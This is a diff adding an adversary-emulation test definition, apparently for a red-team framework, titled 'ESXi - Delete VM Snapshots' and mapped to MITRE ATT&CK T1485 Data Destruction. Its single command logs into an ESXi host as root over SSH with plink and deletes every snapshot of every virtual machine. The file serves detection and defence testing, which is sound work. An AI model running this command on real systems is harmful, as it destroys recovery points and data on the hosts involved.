@@ -1,0 +1,20 @@
+---
+- id: c2929e443ac8e5201d607a53ebdf172d
+  name: ESXi - Delete VM Snapshots
+  description: 'Deletes all snapshots for all Virtual Machines on an ESXi Host
+
+    [Reference](https://lolesxi-project.github.io/LOLESXi/lolesxi/Binaries/vim-cmd/#inhibit%20recovery)
+
+    '
+  tactic: impact
+  technique:
+    attack_id: T1485
+    name: Data Destruction
+  platforms:
+    windows:
+      cmd:
+        command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch
+          "atomic.local" -ssh -l root -pw "password" "for i in `vim-cmd vmsvc/getallvms
+          | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"
+        payloads: []
+        cleanup: ''
